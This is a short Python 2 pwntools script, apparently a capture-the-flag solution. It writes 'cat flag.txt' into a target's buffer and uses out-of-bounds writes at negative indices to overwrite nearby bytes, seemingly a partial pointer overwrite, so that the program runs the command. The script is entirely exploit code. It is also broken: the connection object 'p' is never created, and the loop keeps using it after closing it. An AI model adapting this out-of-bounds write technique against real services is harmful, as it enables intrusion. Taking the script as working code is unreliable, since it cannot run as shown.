from pwn import *
while True:
    bin_sh ='cat flag.txt\0'
    for i in range(len(bin_sh)):
        p.sendlineafter(')\n',str(i))
        p.sendlineafter('index?\n',chr(ord(bin_sh[i])))

    p.sendlineafter(')\n','-104')
    p.sendlineafter('index?\n', chr(16))

    p.sendlineafter(')\n','-103')
    p.sendlineafter('index?\n', chr(0x74))

    p.sendlineafter(')\n','-102')
    p.sendlineafter('index?\n', chr(0x35))

    p.sendlineafter(')\n','15')
    p.sendlineafter('Exit\n','2')
    try:
        print p.recvline()
    except:
        p.close()
        p.shutdown()
